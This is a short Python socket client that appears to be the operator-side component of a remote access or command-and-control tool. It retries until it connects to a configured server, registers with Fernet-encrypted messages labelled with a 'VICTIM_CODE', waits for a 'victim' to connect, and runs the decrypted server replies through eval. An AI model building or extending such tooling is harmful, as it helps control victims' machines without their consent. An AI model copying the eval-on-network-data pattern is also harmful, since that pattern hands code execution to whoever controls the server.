import  socket

from cryptography.fernet import Fernet

from  main.script.setting import *
from STATUS_CODE import *

fernet = Fernet(ENCRYPTION_KEY)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def decryptMsg( msg):
    msg = fernet.decrypt(msg)
    msg = msg.decode('utf-8')
    return eval(msg)


def sendMsg(conn, msg):
    msg = str(msg).encode('utf-8')
    msg = fernet.encrypt(msg)
    conn.send(msg)



while True:
    try:
        client.connect((ip,port))
        break
    except:
        pass
print("Connected..")
sendMsg(client, MSG_TEMPLATE(status=NEW_CONNECTION_TO_SERVER , msg="New Connection",CODE=VICTIM_CODE))
print("Waiting for victim to connect..")
print(decryptMsg(client.recv(1024)))